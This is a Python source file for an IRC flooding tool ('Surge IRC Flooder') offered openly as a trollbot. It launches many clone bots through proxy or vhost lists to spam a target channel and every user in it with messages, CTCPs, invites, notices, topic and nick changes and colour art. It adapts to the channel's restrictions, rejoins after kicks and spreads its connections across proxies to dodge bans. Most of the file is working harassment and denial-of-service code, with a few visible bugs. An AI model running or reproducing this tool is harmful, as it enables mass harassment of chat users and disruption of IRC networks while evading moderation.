#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Surge IRC Flooder - Developed by acidvegas in Python (https://acid.vegas/trollbots)
# surge.py

import argparse
import concurrent.futures
import os
import random
import ssl
import socket
import string
import sys
import threading
import time

sys.dont_write_bytecode = True

import config

# Bad IRC Numerics
bad_numerics = {
	'465' : 'ERR_YOUREBANNEDCREEP',
	'471' : 'ERR_CHANNELISFULL',
	'473' : 'ERR_INVITEONLYCHAN',
	'474' : 'ERR_BANNEDFROMCHAN',
	'475' : 'ERR_BADCHANNELKEY',
	'477' : 'ERR_NEEDREGGEDNICK',
	'519' : 'ERR_TOOMANYUSERS'
}

def alert(msg):
	print(f'{get_time()} | [+] - {msg}')

def debug(msg):
	print(f'{get_time()} | [~] - {msg}')

def error(msg, reason=None):
	if reason:
		print(f'{get_time()} | [!] - {msg} ({reason})')
	else:
		print(f'{get_time()} | [!] - {msg}')

def error_exit(msg):
	raise SystemExit(f'{get_time()} | [!] - {msg}')

def get_time():
	return time.strftime('%I:%M:%S')

def keep_alive():
	try:
		while True:
			input('')
	except KeyboardInterrupt:
		sys.exit()

def random_int(min, max):
	return random.randint(min, max)

def random_str(size):
	return ''.join(random.choice(string.ascii_letters) for _ in range(size))

class clone:
	def __init__(self, data_line):
		self.data_line      = data_line
		self.invite_channel = '#' + random_str(random_int(4,7))
		self.invite_count   = 0
		self.nickname       = random_str(random_int(4,7))
		self.nicklist       = []
		self.sock           = None

	def run(self):
		self.connect()

	def action(self, chan, msg):
		self.sendmsg(chan, f'\x01ACTION {msg}\x01')

	def attack_channel(self):
		while True:
			if not config.attacks.channel:
				error('Channel attack list is empty.')
				break
			else:
				option = random.choice(config.attacks.channel)
				try:
					if option in ('nick','part','topic'):
						if option == 'nick':
							self.nickname = random_str(random_int(4,7))
							self.nick(self.nickname)
						elif option == 'part':
							self.part(config.connection.channel, config.attacks.message)
							time.sleep(config.throttle.rejoin)
							self.join_channel(config.connection.channel, config.connection.key)
						elif option == 'topic':
							self.topic(config.connection.channel, '{0} {1} {2}'.format(random_str(random_int(5,10)), config.attacks.message, random_str(random_int(5, 10))))
					else:
						if self.nicklist:
							message = self.rainbow('{0} {1} {2}'.format(' '.join(random.sample(self.nicklist, 3)), config.attacks.message, ' '.join(random.sample(self.nicklist, 3))))
						else:
							message = self.rainbow(config.attacks.message)
						if option == 'action':
							self.action(config.connection.channel, message)
						elif option == 'ctcp':
							self.ctcp(config.connection.channel, message)
						elif option == 'msg':
							self.sendmsg(config.connection.channel, message)
						elif option == 'notice':
							self.notice(config.connection.channel, message)
					time.sleep(config.throttle.attack)
				except:
					break

	def attack_nicklist(self):
		while True:
			if not self.nicklist:
				error('Nicklist attack list is empty.')
				break
			else:
				try:
					for nick in self.nicklist:
						option = random.choice(config.attacks.nicklist)
						if option == 'ctcp':
							self.ctcp(nick, random.choice(('PING','TIME','VERSION')))
						elif option == 'invite':
							self.invite(nick, self.invite_channel)
							self.invite_count += 1
							if self.invite_count >= 10:
								self.part(self.invite_channel)
								self.invite_channel = '#' + random_str(random_int(5,8))
								self.join(self.invite_channel)
						elif option == 'notice':
							self.notice(nick, config.attacks.message)
						elif option == 'private':
							self.sendmsg(nick, self.rainbow(config.attacks.message))
						time.sleep(config.throttle.attack)
				except:
					break

	def connect(self):
		try:
			self.create_socket()
			self.sock.connect((config.connection.server, config.connection.port))
			self.register()
		except socket.error:
			self.sock.close()
		else:
			self.listen()

	def create_socket(self):
		family = socket.AF_INET6 if config.connection.ipv6 else socket.AF_INET
		if pargs.proxy:
			proxy_server, proxy_port = self.data_line.split(':')
			self.sock = socks.socksocket(family, socket.SOCK_STREAM)
			self.sock.setblocking(0)
			self.sock.settimeout(config.throttle.timeout)
			self.sock.setproxy(socks.PROXY_TYPE_SOCKS5, proxy_server, int(proxy_port))
		elif pargs.vhost:
			self.sock = socket.socket(family, socket.SOCK_STREAM)
			self.sock.bind((self.data_line, 0))
		if config.connection.ssl:
			self.sock = ssl.wrap_socket(self.sock)

	def ctcp(self, target, data):
		self.sendmsg(target, f'\001{data}\001')

	def event_connect(self):
		alert(f'Successful connection. ({self.proxy_server}:{self.proxy_port})')
		self.join_channel(config.connection.channel, config.connection.key)
		self.join_channel(self.invite_channel)

	def event_end_of_names(self):
		threading.Thread(target=self.attack_channel).start()
		threading.Thread(target=self.attack_nicklist).start()

	def event_kick(self, chan, kicked):
		if kicked == self.nickname:
			time.sleep(config.throttle.rejoin)
			self.join_channel(config.connection.channel, config.connection.key)
		else:
			if nick in self.nicklist:
				self.nicklist.remove(nick)

	def event_names(self, chan, names):
		for name in names:
			if name[:1] in '~!@%&+:':
				name = name[1:]
			if name != self.nickname and name not in self.nicklist:
				self.nicklist.append(name)

	def event_nick_in_use(self):
		self.nickname = random_str(random_int(5,8))
		self.nick(self.nickname)

	def event_quit(self, nick):
		if nick in self.nicklist:
			self.nicklist.remove(nick)

	def handle_events(self, data):
		args = data.split()
		if args[0] == 'PING':
			self.raw('PONG ' + args[1][1:])
		elif args[1] == '001':
			self.event_connect()
		elif args[1] == '353':
			chan = args[4]
			if ' :' in data:
				names = data.split(' :')[1].split()
			elif ' *' in data:
				names = data.split(' *')[1].split()
			elif ' =' in data:
				names = data.split(' =')[1].split()
			else:
				names = data.split(chan)[1].split()
			self.event_names(chan, names)
		elif args[1] == '366':
			self.event_end_of_names()
		elif args[1] == '401':
			name = args[3]
			if name in self.nicklist:
				self.nicklist.remove(name)
		elif args[1] == '404':
			if 'ACTIONs are not permitted' in data and 'action' in config.attacks.channel:
				config.attacks.channel.remove('action')
			elif 'Color is not permitted' in data and 'color' in config.attacks.channel:
				config.attacks.channel.remove('color')
			elif 'CTCPs are not permitted' in data and 'ctcp' in config.attacks.channel:
				config.attacks.channel.remove('ctcp')
			elif 'You need voice' in data or 'You must have a registered nick' in data:
				for attack in ('action','ctcp','msg','notice','topic'):
					if attack in config.attacks.channel:
						config.attacks.channel.remove(attack)
			elif 'NOTICEs are not permitted' in data and 'notice' in config.attacks.channel:
				self.attacks_channel.remove('notice')
		elif args[1] == '433':
			self.event_nick_in_use()
		elif args[1] == '447':
			if 'nick' in config.attacks.channel:
				config.attacks.channel.remove('nick')
		elif args[1] == '482':
			if 'topic' in config.attacks.channel:
				config.attacks.channel.remove('topic')
		elif args[1] == '492':
			if 'ctcp' in config.attacks.nicklist:
				config.attacks.nicklist.remove('ctcp')
		elif args[1] == '499':
			if 'topic' in config.attacks.channel:
				config.attacks.channel.remove('topic')
		elif args[1] == '518':
			if 'invite' in config.attacks.nicklist:
				config.attacks.nicklist.remove('invite')
		elif args[1] in bad_numerics:
			error('Flood protection has been enabled!', bad_numerics[args[1]])
			self.sock.close()
		elif args[1] == 'KICK':
			chan   = args[2]
			kicked = args[3]
			self.event_kick(chan, kicked)
		elif args[1] == 'QUIT':
			nick = args[0].split('!')[0][1:]
			self.event_quit(nick)

	def invite(self, nick, chan):
		self.raw(f'INVITE {nick} {chan}')

	def join_channel(self, chan, key=None):
		if key:
			self.raw(f'JOIN {chan} {key}')
		else:
			self.raw('JOIN ' + chan)

	def listen(self):
		while True:
			try:
				data = self.sock.recv(1024).decode('utf-8')
				for line in (line for line in data.split('\r\n') if line):
					if len(line.split()) >= 2:
						self.handle_events(line)
			except (UnicodeDecodeError,UnicodeEncodeError):
				pass
			except:
				break
		self.sock.close()

	def nick(self, nick):
		self.raw('NICK ' + nick)

	def notice(self, target, msg):
		self.raw(f'NOTICE {target} :{msg}')

	def part(self, chan, msg):
		self.raw(f'PART {chan} :{msg}')

	def rainbow(self, msg):
		if 'color' in config.attacks.channel:
			message = ''
			for i in range(random_int(10,20)):
				message += '\x03{0:0>2},{1:0>2}{2}'.format(random_int(2,13), random_int(2,13), '▄')
			message += '\x03{0:0>2} {1} '.format(random_int(2,13), msg)
			for i in range(random_int(10,20)):
				message += '\x03{0:0>2},{1:0>2}{2}'.format(random_int(2,13), random_int(2,13), '▄')
		else:
			message = '{0} {1} {2}'.format(random_str(random_int(10,20)), msg, random_str(random_int(10,20)))
		return message

	def raw(self, msg):
		self.sock.send(bytes(msg + '\r\n', 'utf-8'))

	def register(self):
		if config.connection.password:
			self.raw('PASS ' + config.connection.password)
		self.raw('USER {0} 0 * :{1}'.format(random_str(random_int(5,8)), random_str(random_int(5,8))))
		self.nick(self.nickname)

	def sendmsg(self, target, msg):
		self.raw(f'PRIVMSG {target} :{msg}')

	def topic(self, chan, text):
		self.raw(f'TOPIC {chan} :{text}')

	def unicode(self, msg):
		start = 0x1000
		end   = 0x3000
		message = ''
		for i in range(random.randint(100,150)):
			message = message + chr(random.randint(start, end))
		message = message + msg
		for i in range(random.randint(100,150)):
			message = message + chr(random.randint(start, end))


# Main
print('#'*56)
print('#{0}#'.format(''.center(54)))
print('#{0}#'.format('Surge IRC Flooder'.center(54)))
print('#{0}#'.format('Developed by acidvegas in Python'.center(54)))
print('#{0}#'.format('https://acid.vegas/trollbots'.center(54)))
print('#{0}#'.format(''.center(54)))
print('#'*56)
parser = argparse.ArgumentParser(usage='%(prog)s <input> [options]')
parser.add_argument('input',         help='file to scan')
parser.add_argument('-p', '--proxy', help='proxy list', action='store_true')
parser.add_argument('-v', '--vhost', help='vhost list', action='store_true')
pargs = parser.parse_args()
if (pargs.proxy and pargs.vhost) or (not pargs.proxy and not pargs.vhost):
	error_exit('Invalid arguments.')
if pargs.proxy:
	try:
		import socks
	except ImportError:
		error_exit('Missing PySocks module! (https://pypi.python.org/pypi/PySocks)')
if not os.path.isfile(pargs.input):
	error_exit('No such input file.')
data_lines = [line.strip() for line in open(pargs.input).readlines() if line]
debug(f'Loaded {len(data_lines)} lines from file.')
random.shuffle(data_lines)
for i in range(config.throttle.concurrency):
	with concurrent.futures.ThreadPoolExecutor(max_workers=config.throttle.threads) as executor:
		checks = {executor.submit(clone(line).connect): line for line in data_lines}
		for future in concurrent.futures.as_completed(checks):
			checks[future]
debug('Flooding is complete.')